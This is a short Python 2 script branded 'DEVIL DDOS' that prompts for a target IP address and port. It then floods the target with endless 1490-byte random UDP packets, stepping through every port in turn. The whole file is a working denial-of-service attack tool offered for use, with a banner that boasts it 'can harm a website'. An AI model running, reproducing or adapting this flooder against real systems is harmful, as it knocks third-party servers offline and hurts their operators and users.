import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DEVIL DDOS")
print
print "Author   : Anonymous Devil"
print "You Tube : https://www.youtube.com/channel/UCetPBjdtKQMh1l4Ogt2buxQ"
print "DEVIL DDOS"
print "==================Anonymous DEVIL=========="
print
ip = raw_input("IP  : ")
port = input("Port  : ")

os.system("clear")
os.system("figlet Devil can harm a website.")
print "[   ] 0% "
time.sleep(5)
print "[=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+] 100%"
time.sleep(13)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "packet to %s throught port:%s"%(ip,port)
     if port == 65534:
       port = 1

